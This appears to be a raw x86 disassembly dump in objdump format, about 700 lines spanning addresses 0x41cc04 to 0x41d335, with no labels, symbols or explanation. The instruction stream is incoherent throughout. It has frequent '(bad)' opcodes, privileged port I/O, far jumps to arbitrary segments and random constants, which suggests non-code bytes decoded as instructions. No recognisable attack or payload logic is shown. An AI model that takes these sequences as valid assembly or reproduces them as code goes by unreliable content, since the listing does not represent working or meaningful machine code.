  41cc04:	sub    BYTE PTR [eax],bh
  41cc06:	fsubr  QWORD PTR [ecx]
  41cc08:	imul   BYTE PTR [ebp-0x3]
  41cc0b:	out    dx,eax
  41cc0c:	(bad)  
  41cc0d:	pop    ebx
  41cc0e:	rcl    esp,cl
  41cc10:	out    dx,eax
  41cc11:	sub    DWORD PTR [ecx-0x64],ebx
  41cc14:	jb     0x41cc4e
  41cc16:	fxtract 
  41cc18:	push   edx
  41cc19:	dec    esi
  41cc1a:	mov    al,ds:0xc8d2ee15
  41cc1f:	push   0x436287a9
  41cc24:	sub    BYTE PTR [edx+0x31651d80],al
  41cc2a:	jne    0x41cbcd
  41cc2c:	shl    DWORD PTR [eax-0x5c],cl
  41cc2f:	xor    eax,0x74196397
  41cc34:	aam    0x5c
  41cc36:	sbb    bh,bh
  41cc38:	shr    ebx,0x3f
  41cc3b:	in     al,0x59
  41cc3d:	sbb    al,0xcb
  41cc3f:	lods   eax,DWORD PTR ds:[esi]
  41cc40:	adc    eax,0x3de1047a
  41cc45:	(bad)  
  41cc46:	xchg   ebp,eax
  41cc47:	fisttp DWORD PTR [edi-0x805d190]
  41cc4d:	mov    ebp,0x61a6abc3
  41cc52:	(bad)  
  41cc53:	aad    0x7
  41cc55:	sub    eax,0x7b910240
  41cc5a:	outs   dx,DWORD PTR ds:[esi]
  41cc5b:	cmp    eax,0xb0a1ca15
  41cc60:	js     0x41ccde
  41cc62:	outs   dx,BYTE PTR ds:[esi]
  41cc63:	xchg   edi,eax
  41cc64:	mov    ebx,0xbb83f1e8
  41cc69:	push   ebx
  41cc6a:	je     0x41cc79
  41cc6c:	scas   al,BYTE PTR es:[edi]
  41cc6d:	push   ds
  41cc6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc6f:	pop    eax
  41cc70:	mov    cl,0xd8
  41cc72:	ss mov ch,0x89
  41cc75:	jae    0x41cc86
  41cc77:	mov    bh,0x79
  41cc79:	push   ebx
  41cc7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc7b:	sub    DWORD PTR [esp+ebp*8+0x77b18253],0xffffff8a
  41cc83:	clc    
  41cc84:	xlat   BYTE PTR ds:[ebx]
  41cc85:	add    al,0xe3
  41cc87:	sub    edi,ecx
  41cc89:	sahf   
  41cc8a:	mov    WORD PTR [edx+0x4],?
  41cc8d:	rol    BYTE PTR [ebx+0x3d5583],0x5
  41cc94:	xchg   ecx,eax
  41cc95:	jecxz  0x41cc52
  41cc97:	pop    ecx
  41cc98:	add    bh,BYTE PTR [esi-0x36dd0e5d]
  41cc9e:	pushf  
  41cc9f:	aaa    
  41cca0:	stc    
  41cca1:	mov    ebx,0xb1e7d621
  41cca6:	je     0x41cc5e
  41cca8:	mov    dl,0xe7
  41ccaa:	sub    BYTE PTR [eax+0x2de39ff],bh
  41ccb0:	out    dx,eax
  41ccb1:	dec    esp
  41ccb2:	mov    edx,0xe8916bd9
  41ccb7:	mov    edx,0x84dfccd
  41ccbc:	cwde   
  41ccbd:	mov    dh,0x87
  41ccbf:	push   cs
  41ccc0:	daa    
  41ccc1:	and    ecx,edx
  41ccc3:	inc    ebp
  41ccc4:	pop    ebp
  41ccc5:	mov    esi,0xad14f1cc
  41ccca:	ret    0xbebf
  41cccd:	scas   eax,DWORD PTR es:[edi]
  41ccce:	and    al,BYTE PTR [ebx]
  41ccd0:	cdq    
  41ccd1:	das    
  41ccd2:	shr    DWORD PTR [esi+0x3e],1
  41ccd5:	mov    cl,0x39
  41ccd7:	stos   BYTE PTR es:[edi],al
  41ccd8:	in     eax,0xb2
  41ccda:	mov    ds:0x8fb27d6a,al
  41ccdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cce0:	mov    eax,0x97e16661
  41cce5:	push   0xffffffa5
  41cce7:	pop    esi
  41cce8:	add    BYTE PTR [edx+ebp*2+0x13],dl
  41ccec:	jmp    0x9815:0x38a6f60
  41ccf3:	push   ss
  41ccf4:	retf   
  41ccf5:	rcl    BYTE PTR [ecx+0x66c52a8f],0xe4
  41ccfc:	inc    ecx
  41ccfd:	cwde   
  41ccfe:	jg     0x41ccc5
  41cd00:	xchg   ecx,eax
  41cd01:	jno    0x41cceb
  41cd03:	pop    es
  41cd04:	fwait
  41cd05:	test   DWORD PTR [ecx],ebp
  41cd07:	or     eax,ecx
  41cd09:	pusha  
  41cd0a:	retf   
  41cd0b:	imul   edx,DWORD PTR [edi-0x67],0x16
  41cd0f:	sar    DWORD PTR [ebp+0xaa33ebe],0x43
  41cd16:	adc    bh,BYTE PTR [eax+0x7b]
  41cd19:	inc    esi
  41cd1a:	jmp    0x441f:0x2d3a8dd6
  41cd21:	add    al,0x3e
  41cd23:	sti    
  41cd24:	xchg   al,cl
  41cd26:	xor    ebp,DWORD PTR [esi+0x65]
  41cd29:	mov    edi,0x6041f69
  41cd2e:	xchg   edx,eax
  41cd2f:	add    DWORD PTR [ecx+edx*4+0x4302fb85],esp
  41cd36:	(bad)  
  41cd37:	stos   BYTE PTR es:[edi],al
  41cd38:	and    ebp,DWORD PTR [edx+0x7d684af6]
  41cd3e:	ins    BYTE PTR es:[edi],dx
  41cd3f:	xchg   ebp,eax
  41cd40:	mov    BYTE PTR [edi+0x12],0xdc
  41cd44:	xchg   BYTE PTR [ebx+eiz*2-0x290f7c9c],dh
  41cd4b:	cmp    bh,cl
  41cd4d:	xchg   ecx,eax
  41cd4e:	inc    esi
  41cd4f:	es push es
  41cd51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd52:	enter  0xd02a,0x6c
  41cd56:	data16 jge 0x41cdbd
  41cd59:	aaa    
  41cd5a:	lahf   
  41cd5b:	sbb    BYTE PTR [edi+eiz*2],dl
  41cd5e:	repnz xor bh,0x64
  41cd62:	inc    esi
  41cd63:	in     eax,dx
  41cd64:	pop    esp
  41cd65:	jl     0x41cd48
  41cd67:	sub    bl,BYTE PTR [ebp-0x60f2f5bf]
  41cd6d:	jmp    0xd5caf8c5
  41cd72:	aas    
  41cd73:	retf   
  41cd74:	or     al,0xa8
  41cd76:	jnp    0x41cdcd
  41cd78:	das    
  41cd79:	pusha  
  41cd7a:	dec    ebx
  41cd7b:	xor    al,0xb7
  41cd7d:	(bad)  
  41cd7e:	pop    eax
  41cd7f:	dec    ecx
  41cd80:	mov    BYTE PTR [edx+0x22cae051],ch
  41cd86:	jne    0x41cd2d
  41cd88:	fidivr WORD PTR [edx]
  41cd8a:	mov    esp,0x15d9277c
  41cd8f:	neg    dh
  41cd91:	xor    dh,BYTE PTR [ebx+eiz*2+0x55]
  41cd95:	mov    ds:0x6f58e34a,al
  41cd9a:	push   esi
  41cd9b:	outs   dx,DWORD PTR ds:[esi]
  41cd9c:	add    al,0x6
  41cd9e:	stos   DWORD PTR es:[edi],eax
  41cd9f:	xchg   BYTE PTR [edi],bl
  41cda1:	out    dx,al
  41cda2:	dec    ecx
  41cda3:	mov    edi,0x621c7adb
  41cda8:	fdivr  DWORD PTR [ebx]
  41cdaa:	xor    BYTE PTR [edi+ecx*8+0x6d],cl
  41cdae:	out    0xd2,al
  41cdb0:	mov    ecx,0xb682cc42
  41cdb5:	sub    dh,BYTE PTR [ebx-0x286d7275]
  41cdbb:	mov    ds:0xe249f8e9,al
  41cdc0:	jp     0x41cd59
  41cdc2:	in     al,0x2
  41cdc4:	vfmadd213sd xmm4,xmm1,QWORD PTR ds:0x33604233
  41cdcd:	jmp    0xb0dd6e46
  41cdd2:	clc    
  41cdd3:	and    eax,0xec1311d5
  41cdd8:	in     al,0x20
  41cdda:	out    dx,al
  41cddb:	pop    esp
  41cddc:	imul   ah
  41cdde:	adc    eax,0xc3521006
  41cde3:	outs   dx,BYTE PTR ds:[esi]
  41cde4:	push   esp
  41cde5:	xchg   ecx,eax
  41cde6:	test   al,0xea
  41cde8:	add    eax,0x8fccc6f3
  41cded:	ds push esp
  41cdef:	jmp    0x936de266
  41cdf4:	enter  0x991b,0xb8
  41cdf8:	push   ds
  41cdf9:	mov    esi,0x9fa27b13
  41cdfe:	jge    0x41ce71
  41ce00:	(bad)  
  41ce01:	jo     0x41cd9e
  41ce03:	xchg   ecx,eax
  41ce04:	dec    esp
  41ce05:	pop    ebx
  41ce06:	inc    edi
  41ce07:	and    BYTE PTR [eax+0x24],0xb6
  41ce0b:	jns    0x41cda6
  41ce0d:	ror    DWORD PTR ds:0xe15bbce0,0x6
  41ce14:	test   DWORD PTR [esi],0xfc48cdca
  41ce1a:	cmp    eax,0x40bbe167
  41ce1f:	jno    0x41cda4
  41ce21:	jl     0x41ce9f
  41ce23:	(bad)  
  41ce24:	cmp    eax,0xb9ab3012
  41ce29:	cmc    
  41ce2a:	push   eax
  41ce2b:	cmp    al,0xb3
  41ce2d:	jmp    0xbe8:0x192a0b8e
  41ce34:	in     eax,0x4b
  41ce36:	adc    al,0xdd
  41ce38:	dec    esi
  41ce39:	xchg   esp,eax
  41ce3a:	xor    al,0x86
  41ce3c:	pusha  
  41ce3d:	xor    DWORD PTR [edx+0x77],edi
  41ce40:	push   edi
  41ce41:	mov    esi,0x670026fc
  41ce46:	popf   
  41ce47:	xchg   ebp,eax
  41ce48:	or     dh,BYTE PTR [ebx+eiz*8+0x27]
  41ce4c:	mov    bl,al
  41ce4e:	sbb    al,0xc
  41ce50:	jecxz  0x41ceb2
  41ce52:	out    dx,eax
  41ce53:	neg    DWORD PTR [edi]
  41ce55:	out    0x54,eax
  41ce57:	daa    
  41ce58:	jle    0x41ceca
  41ce5a:	xchg   edx,eax
  41ce5b:	rcr    BYTE PTR [ebx+esi*2-0x2d43ec1e],0xe7
  41ce63:	inc    ebp
  41ce64:	(bad)  
  41ce65:	jo     0x41cedc
  41ce67:	xchg   edx,eax
  41ce68:	xchg   esp,eax
  41ce69:	scas   eax,DWORD PTR es:[edi]
  41ce6a:	jmp    0x41ce55
  41ce6c:	imul   DWORD PTR [eax]
  41ce6e:	lahf   
  41ce6f:	int3   
  41ce70:	into   
  41ce71:	das    
  41ce72:	sub    ch,BYTE PTR [edx+eiz*4+0x417d85c5]
  41ce79:	jns    0x41ce0b
  41ce7b:	adc    al,0x2d
  41ce7d:	add    BYTE PTR [edx],bh
  41ce7f:	cli    
  41ce80:	stos   DWORD PTR es:[edi],eax
  41ce81:	xchg   esi,eax
  41ce82:	fcmovne st,st(6)
  41ce84:	or     eax,0x4c22bd8e
  41ce89:	cs push 0xb6168ff4
  41ce8f:	call   DWORD PTR [esi+ebp*8-0x76]
  41ce93:	push   ss
  41ce94:	rcr    DWORD PTR [esi+edx*4-0x17],0xef
  41ce99:	sub    DWORD PTR [esi-0x2412f4cc],eax
  41ce9f:	sbb    BYTE PTR [edx*2+0x67672fdb],0x14
  41cea7:	adc    ebp,edi
  41cea9:	mov    esp,0x2df3f3eb
  41ceae:	imul   esi,edx,0x3a4510c4
  41ceb4:	aam    0x5f
  41ceb6:	dec    ebx
  41ceb7:	sub    BYTE PTR [esi-0xec2ea7c],ch
  41cebd:	pop    edx
  41cebe:	shl    DWORD PTR [edx+ecx*4],1
  41cec1:	inc    edx
  41cec2:	pushf  
  41cec3:	dec    edi
  41cec4:	aad    0x98
  41cec6:	dec    edx
  41cec7:	adc    DWORD PTR [ebx+0x7e7df465],0x58
  41cece:	sbb    ecx,DWORD PTR [edx]
  41ced0:	mov    dl,0xba
  41ced2:	mov    eax,0x5c8c3087
  41ced7:	(bad)  
  41ced8:	push   esp
  41ced9:	mov    cl,0x4a
  41cedb:	in     eax,dx
  41cedc:	xchg   BYTE PTR [edi-0x7b],dl
  41cedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cee0:	cmp    BYTE PTR [ebx-0x71c25287],0x12
  41cee7:	ds push ebp
  41cee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceea:	loope  0x41ce95
  41ceec:	sbb    al,0xe0
  41ceee:	popf   
  41ceef:	enter  0xffba,0xbf
  41cef3:	clc    
  41cef4:	jge    0x41cf19
  41cef6:	push   ebx
  41cef7:	ret    
  41cef8:	into   
  41cef9:	dec    edi
  41cefa:	jecxz  0x41cf0f
  41cefc:	inc    edi
  41cefd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cefe:	pop    edx
  41ceff:	jbe    0x41cf5a
  41cf01:	loop   0x41cef3
  41cf03:	add    esp,DWORD PTR [eax+ebx*1]
  41cf06:	and    al,0x7f
  41cf08:	and    DWORD PTR [eax-0x21dcd5d5],ebx
  41cf0e:	jecxz  0x41cec3
  41cf10:	mov    DWORD PTR [ebx+0x4d5ec29a],esi
  41cf16:	xor    ah,BYTE PTR [esi-0x6887d4f9]
  41cf1c:	xchg   edx,eax
  41cf1d:	sbb    ch,ch
  41cf1f:	fnstsw WORD PTR [eax]
  41cf21:	mov    ch,0x2
  41cf23:	push   cs
  41cf24:	cld    
  41cf25:	mov    ebx,0xbac46466
  41cf2a:	loope  0x41cf58
  41cf2c:	dec    eax
  41cf2d:	sar    BYTE PTR [edi-0x61],0xd8
  41cf31:	das    
  41cf32:	dec    ecx
  41cf33:	rcr    BYTE PTR [esi+0x33],1
  41cf36:	push   eax
  41cf37:	push   ebx
  41cf38:	in     eax,dx
  41cf39:	js     0x41cf53
  41cf3b:	jmp    0xfecd:0x9d224720
  41cf42:	ins    BYTE PTR es:[edi],dx
  41cf43:	push   eax
  41cf44:	and    ch,bl
  41cf46:	pop    ecx
  41cf47:	mov    eax,0xb3d4174f
  41cf4c:	xchg   ebp,eax
  41cf4d:	ss mov bl,cl
  41cf50:	cld    
  41cf51:	sbb    bl,cl
  41cf53:	mov    ch,BYTE PTR [esi+eiz*1-0x6869f695]
  41cf5a:	mov    eax,ds:0xad2bb16b
  41cf5f:	inc    eax
  41cf60:	lods   al,BYTE PTR ds:[esi]
  41cf61:	cs mov eax,0x92349e29
  41cf67:	imul   ebp,DWORD PTR [ebp-0x2014118f],0xffffffee
  41cf6e:	xor    ecx,DWORD PTR [ebx*8-0xa70b7b0]
  41cf75:	lods   al,BYTE PTR ds:[esi]
  41cf76:	mov    ebp,DWORD PTR [edx+0x2b]
  41cf79:	sbb    BYTE PTR [eax+edi*4+0x55bf65df],dl
  41cf80:	call   0x2e47:0xc69e6694
  41cf87:	cld    
  41cf88:	xchg   ebx,eax
  41cf89:	inc    ecx
  41cf8a:	in     eax,0x2f
  41cf8c:	scas   eax,DWORD PTR es:[edi]
  41cf8d:	shl    edx,0x60
  41cf90:	into   
  41cf91:	pop    es
  41cf92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf93:	lea    ecx,[ebx+0x2a]
  41cf96:	mov    BYTE PTR [ebx],dl
  41cf98:	xchg   esi,eax
  41cf99:	sub    eax,0x5b099ad9
  41cf9e:	cmp    eax,esi
  41cfa0:	dec    eax
  41cfa1:	cmp    esi,DWORD PTR [ebx+0x7e]
  41cfa4:	cmc    
  41cfa5:	dec    ecx
  41cfa6:	add    BYTE PTR [edx],bl
  41cfa8:	mov    ds:0x8663026b,al
  41cfad:	add    BYTE PTR [eax],al
  41cfaf:	add    BYTE PTR [eax],al
  41cfb1:	add    BYTE PTR [ebx-0x37],bh
  41cfb4:	xor    bh,0xb2
  41cfb7:	(bad)  
  41cfb8:	jg     0x41cf87
  41cfba:	sbb    DWORD PTR [esp+esi*1-0x5b],0x2516b112
  41cfc2:	inc    ecx
  41cfc3:	dec    ebx
  41cfc4:	add    DWORD PTR [eax],eax
  41cfc6:	repz add al,0x0
  41cfc9:	add    BYTE PTR [edi],cl
  41cfcb:	cmp    DWORD PTR [eax+eiz*2],eax
  41cfce:	test   DWORD PTR [esi],edi
  41cfd0:	adc    al,0x3b
  41cfd2:	sub    dl,bl
  41cfd4:	call   0x4447:0x6ae1f426
  41cfdb:	inc    ecx
  41cfdc:	ds mov dl,0x26
  41cfdf:	and    eax,DWORD PTR [edi+ebx*4-0x21de14d0]
  41cfe6:	dec    edx
  41cfe7:	adc    DWORD PTR fs:[edx],edx
  41cfea:	icebp  
  41cfeb:	xlat   BYTE PTR ds:[ebx]
  41cfec:	es add esp,esp
  41cfef:	and    dh,BYTE PTR [edx]
  41cff1:	arpl   WORD PTR [ebp+0x372acf7f],bx
  41cff7:	ds adc eax,0x18ca801c
  41cffd:	and    ecx,DWORD PTR [esi+eax*8+0x6b9f8530]
  41d004:	push   edx
  41d005:	sar    DWORD PTR [esi+0x36f0c1b1],cl
  41d00b:	add    al,0xdd
  41d00d:	ins    DWORD PTR es:[edi],dx
  41d00e:	cmp    BYTE PTR [ebx-0x47],dh
  41d011:	jg     0x41d066
  41d013:	xchg   esi,eax
  41d014:	sbb    DWORD PTR [eax-0x2c],0xffffffbe
  41d018:	imul   ecx,DWORD PTR [edx-0x3e],0x4c
  41d01c:	cmc    
  41d01d:	dec    edx
  41d01e:	or     DWORD PTR [ebp+0x59a67298],ecx
  41d024:	dec    ebx
  41d025:	xor    BYTE PTR [edx-0x3aaddf06],cl
  41d02b:	cmp    DWORD PTR [edx],esi
  41d02d:	inc    eax
  41d02e:	retf   0x3f46
  41d031:	sbb    bl,dl
  41d033:	sbb    al,BYTE PTR [eax]
  41d035:	sbb    ebx,DWORD PTR [esi-0x1371e633]
  41d03b:	mov    cl,0xbb
  41d03d:	fcomip st,st(5)
  41d03f:	xchg   edx,eax
  41d040:	push   ecx
  41d041:	or     cl,BYTE PTR [edx]
  41d043:	push   esi
  41d044:	inc    esp
  41d045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d046:	sub    ecx,0x29dc488
  41d04c:	shl    BYTE PTR [ecx+0x42],cl
  41d04f:	jae    0x41d049
  41d051:	xlat   BYTE PTR ds:[ebx]
  41d052:	add    DWORD PTR [edx+esi*8+0x3a],ebx
  41d056:	mov    edi,0x213f931b
  41d05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d05c:	(bad)  
  41d05d:	mov    al,ds:0x292e6329
  41d062:	js     0x41d05b
  41d064:	xchg   DWORD PTR [ebx],eax
  41d066:	xchg   edi,eax
  41d067:	xor    eax,0x8948acf0
  41d06c:	inc    esi
  41d06d:	and    BYTE PTR [ebp-0x4f],bl
  41d070:	sub    al,0xf6
  41d072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d073:	sub    esp,edi
  41d075:	mov    eax,ds:0xa96fe0b7
  41d07a:	jp     0x41d018
  41d07c:	adc    DWORD PTR [ebx+0x4200ba6f],0x53
  41d083:	jge    0x41d095
  41d085:	shr    BYTE PTR [edi+eiz*4-0x59],cl
  41d089:	cli    
  41d08a:	mov    ds,WORD PTR [ebx+0x24486c6b]
  41d090:	adc    edi,DWORD PTR [eax+0x11f1fb8d]
  41d096:	mov    eax,DWORD PTR es:[edx]
  41d099:	adc    ebp,DWORD PTR [ebx-0x7e24e457]
  41d09f:	push   eax
  41d0a0:	jmp    0x41d0a3
  41d0a2:	ret    0xc247
  41d0a5:	push   ds
  41d0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0a7:	adc    al,0xe3
  41d0a9:	test   DWORD PTR [esi-0x1cf37749],0xf6c139aa
  41d0b3:	out    dx,eax
  41d0b4:	or     BYTE PTR [esi],ah
  41d0b6:	cmp    bl,al
  41d0b8:	cwde   
  41d0b9:	(bad)  
  41d0ba:	and    DWORD PTR [ebx],ebx
  41d0bc:	push   0x679eb073
  41d0c1:	pop    ebp
  41d0c2:	xor    eax,0x43b9b7e6
  41d0c7:	daa    
  41d0c8:	sti    
  41d0c9:	clc    
  41d0ca:	dec    esi
  41d0cb:	adc    ebp,DWORD PTR [esi-0x68]
  41d0ce:	push   esi
  41d0cf:	loopne 0x41d0d4
  41d0d1:	mov    DWORD PTR [esi-0xc360497],edx
  41d0d7:	mov    edi,DWORD PTR [ecx-0x27]
  41d0da:	in     al,dx
  41d0db:	lock inc esp
  41d0dd:	xchg   edi,eax
  41d0de:	call   0x5abaa54e
  41d0e3:	push   edx
  41d0e4:	push   edx
  41d0e5:	aad    0x44
  41d0e7:	fimul  DWORD PTR [esi+0x2e]
  41d0ea:	inc    edi
  41d0eb:	es xchg edi,eax
  41d0ed:	adc    DWORD PTR [ebx+ebx*4+0x3b],ebx
  41d0f1:	mov    bh,0xb7
  41d0f3:	out    0xef,eax
  41d0f5:	sub    dl,ah
  41d0f7:	adc    al,0x37
  41d0f9:	sub    DWORD PTR [edi+0x1eb10d23],eax
  41d0ff:	xchg   ecx,eax
  41d100:	jno    0x41d11e
  41d102:	stc    
  41d103:	jns    0x41d0a1
  41d105:	lea    esp,[esi]
  41d107:	je     0x41d13b
  41d109:	(bad)  
  41d10a:	jmp    0xc5da4e9f
  41d10f:	mov    edx,0x8b4831c1
  41d114:	jb     0x41d157
  41d116:	fidiv  WORD PTR [ecx-0x56]
  41d119:	or     ebx,esi
  41d11b:	ret    0x3823
  41d11e:	leave  
  41d11f:	in     eax,dx
  41d120:	sbb    al,0xf4
  41d122:	pop    ecx
  41d123:	repz rcr BYTE PTR [edi-0x2d],cl
  41d127:	pusha  
  41d128:	aam    0xfd
  41d12a:	icebp  
  41d12b:	cdq    
  41d12c:	std    
  41d12d:	clc    
  41d12e:	nop
  41d12f:	or     BYTE PTR [edi+ebx*2+0x5e11a433],0x5a
  41d137:	add    ecx,esi
  41d139:	jmp    0xfae3:0x9ba42b8a
  41d140:	adc    al,0x9c
  41d142:	xchg   edi,eax
  41d143:	gs mov edi,0x9eabb49c
  41d149:	lahf   
  41d14a:	or     eax,0x6c16c0d4
  41d14f:	sub    ebp,ecx
  41d151:	and    al,0xdf
  41d153:	push   cs
  41d154:	push   ds
  41d155:	ret    
  41d156:	cmp    BYTE PTR [ebx-0x21516f3],0x21
  41d15d:	mov    al,BYTE PTR [eax+0x33]
  41d160:	scas   al,BYTE PTR es:[edi]
  41d161:	pop    ds
  41d162:	aam    0x67
  41d164:	(bad)  
  41d165:	xor    al,0xa9
  41d167:	mov    ebp,0xee1087e1
  41d16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d16d:	or     eax,DWORD PTR [esi]
  41d16f:	das    
  41d170:	scas   eax,DWORD PTR es:[edi]
  41d171:	mov    DWORD PTR es:[ecx+0x4cd568fd],ecx
  41d178:	dec    ecx
  41d17a:	jnp    0x41d120
  41d17c:	cld    
  41d17d:	lahf   
  41d17e:	mov    BYTE PTR [esi],dl
  41d180:	jecxz  0x41d1a0
  41d182:	(bad)  
  41d183:	daa    
  41d184:	and    al,0xcc
  41d186:	inc    ecx
  41d187:	or     edx,DWORD PTR ds:0x12a80a78
  41d18d:	pop    es
  41d18e:	daa    
  41d18f:	lods   eax,DWORD PTR ds:[esi]
  41d190:	test   DWORD PTR [eax+ecx*2],edx
  41d193:	mov    al,0xce
  41d195:	fdivr  QWORD PTR [eax]
  41d197:	jmp    FWORD PTR [esi+0x74]
  41d19a:	pop    esi
  41d19b:	cld    
  41d19c:	dec    esi
  41d19d:	inc    esi
  41d19e:	fwait
  41d19f:	rol    BYTE PTR [ebp-0x71e09fea],0xcb
  41d1a6:	push   cs
  41d1a7:	jecxz  0x41d1cd
  41d1a9:	or     DWORD PTR [esi+0x6e],ecx
  41d1ac:	xor    al,0x9b
  41d1ae:	into   
  41d1af:	jecxz  0x41d202
  41d1b1:	es pop ecx
  41d1b3:	out    dx,eax
  41d1b4:	jnp    0x41d1cf
  41d1b6:	inc    ebp
  41d1b7:	jl     0x41d1ac
  41d1b9:	mov    ch,0x32
  41d1bb:	push   0xffffffd0
  41d1bd:	or     al,0x1c
  41d1bf:	sar    DWORD PTR [edx-0x7afbabc6],1
  41d1c5:	xlat   BYTE PTR ds:[ebx]
  41d1c6:	fisub  DWORD PTR [ebx+edi*2]
  41d1c9:	pop    ecx
  41d1ca:	pop    es
  41d1cb:	mov    al,0x96
  41d1cd:	lock imul ecx,DWORD PTR [edx+ebp*4+0x37],0x7f
  41d1d3:	mov    eax,DWORD PTR [ebx-0x79]
  41d1d6:	idiv   bh
  41d1d8:	jmp    0xa23a:0xd9cfa87a
  41d1df:	jp     0x41d1cb
  41d1e1:	pop    edx
  41d1e2:	test   DWORD PTR [edx],esp
  41d1e4:	sub    eax,0x80840ced
  41d1e9:	push   ss
  41d1ea:	inc    esp
  41d1eb:	lahf   
  41d1ec:	xchg   esi,eax
  41d1ed:	loop   0x41d1b0
  41d1ef:	push   ebx
  41d1f0:	jae    0x41d19e
  41d1f2:	add    eax,0x383777bb
  41d1f7:	push   0xfffffff4
  41d1f9:	add    cl,BYTE PTR [eax+0x5d]
  41d1fc:	cmp    edi,eax
  41d1fe:	int3   
  41d1ff:	dec    edx
  41d200:	push   ecx
  41d201:	ins    DWORD PTR es:[edi],dx
  41d202:	bound  esi,QWORD PTR [edi]
  41d204:	inc    eax
  41d205:	inc    ebx
  41d206:	push   ss
  41d207:	xor    BYTE PTR [edx-0x21],0xfc
  41d20b:	sub    DWORD PTR [edi-0x57b8f74b],ebp
  41d211:	in     al,0x65
  41d213:	or     BYTE PTR [ebp+0x2ad51b98],dl
  41d219:	cmp    edi,DWORD PTR [ebx]
  41d21b:	lahf   
  41d21c:	mov    BYTE PTR [edi],dl
  41d21e:	jnp    0x41d28b
  41d220:	lea    ecx,[edi-0x44]
  41d223:	push   cs
  41d224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d225:	sub    al,0xcb
  41d227:	loope  0x41d262
  41d229:	push   ebx
  41d22a:	pop    ebx
  41d22b:	cmp    al,0x73
  41d22d:	repnz pop edx
  41d22f:	bound  ebx,QWORD PTR [ebx-0x5b]
  41d232:	xlat   BYTE PTR ds:[ebx]
  41d233:	dec    edi
  41d234:	or     al,0xb7
  41d236:	xlat   BYTE PTR ds:[ebx]
  41d237:	imul   esi,ecx,0xb1937d82
  41d23d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d23e:	sbb    dh,bh
  41d240:	pop    ebx
  41d241:	mov    edi,0x459594f9
  41d246:	push   ds
  41d247:	aaa    
  41d248:	mov    al,0xf8
  41d24a:	test   BYTE PTR [esi-0x35174dd5],0x81
  41d251:	not    BYTE PTR ds:[ecx-0x79]
  41d255:	retf   0x50
  41d258:	and    BYTE PTR [ecx-0x7c83f84f],bl
  41d25e:	adc    eax,DWORD PTR [edx-0x40]
  41d261:	daa    
  41d262:	popf   
  41d263:	push   ebx
  41d264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d266:	stc    
  41d267:	ret    0x7bf9
  41d26a:	mov    ecx,DWORD PTR [eax*8-0x6d0d4bbf]
  41d271:	test   esp,esi
  41d273:	xor    edi,DWORD PTR [ecx+0x6d]
  41d276:	ret    0x43dd
  41d279:	sub    BYTE PTR [edx+0x6],dl
  41d27c:	push   cs
  41d27d:	xchg   edi,eax
  41d27e:	push   0xffffffa8
  41d280:	mov    ds:0xef3f40c0,eax
  41d285:	xchg   ecx,eax
  41d286:	in     eax,dx
  41d287:	rol    dh,1
  41d289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d28a:	fsub   st,st(1)
  41d28c:	sbb    edx,DWORD PTR [edx-0x56]
  41d28f:	lods   al,BYTE PTR ds:[esi]
  41d290:	pusha  
  41d291:	leave  
  41d292:	xor    al,0x66
  41d294:	mov    esi,0x791ee2c0
  41d299:	(bad)  
  41d29a:	rsqrtps xmm1,XMMWORD PTR [esi-0x61d8a505]
  41d2a1:	cmp    eax,0x246c15bf
  41d2a6:	test   DWORD PTR [ecx+0x43],ecx
  41d2a9:	or     DWORD PTR [ebx+0x1df82f2b],eax
  41d2af:	loop   0x41d233
  41d2b1:	lock jg 0x41d2a0
  41d2b4:	jmp    0x41d2bd
  41d2b6:	sar    DWORD PTR [eax-0x2b78889a],1
  41d2bc:	mov    edx,0xbef361e7
  41d2c1:	pushf  
  41d2c2:	les    ecx,FWORD PTR [ebx-0x70]
  41d2c5:	cld    
  41d2c6:	xlat   BYTE PTR ds:[ebx]
  41d2c7:	sub    eax,DWORD PTR [ebp+0x1c578a3e]
  41d2cd:	int    0x31
  41d2cf:	add    DWORD PTR [ebp+0x1a8d84cc],esp
  41d2d5:	lock shr BYTE PTR [ebp-0x70ae797d],cl
  41d2dc:	add    eax,eax
  41d2de:	xor    eax,0xc288af70
  41d2e3:	loopne 0x41d2ae
  41d2e5:	jg     0x41d296
  41d2e7:	dec    edi
  41d2e8:	sbb    DWORD PTR [edi],esp
  41d2ea:	mov    al,ds:0x179ae198
  41d2ef:	push   esp
  41d2f0:	add    bh,dl
  41d2f2:	adc    cl,ah
  41d2f4:	ficom  DWORD PTR [edi-0x116ec174]
  41d2fa:	fdiv   DWORD PTR [edi-0x57]
  41d2fd:	adc    DWORD PTR [ebp+eax*8-0x62e73890],esp
  41d304:	sbb    eax,0x63f29e3b
  41d309:	sbb    dh,ch
  41d30b:	sahf   
  41d30c:	popf   
  41d30d:	jno    0x41d38a
  41d30f:	es inc edi
  41d311:	outs   dx,BYTE PTR ds:[esi]
  41d312:	mov    dh,0xd3
  41d314:	sub    dh,al
  41d316:	pop    ss
  41d317:	(bad)
  41d31a:	(bad)  
  41d31b:	dec    ebp
  41d31c:	or     edi,0xaa57d667
  41d322:	mov    ah,0x11
  41d324:	in     al,dx
  41d325:	dec    ebp
  41d326:	cmp    eax,0x20f8195c
  41d32b:	jmp    0x41d39a
  41d32d:	pop    eax
  41d32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d32f:	push   0xffffffbc
  41d331:	mov    al,0x80
  41d333:	aaa    
  41d334:	pop    ecx
  41d335:	fmul   st(0),st
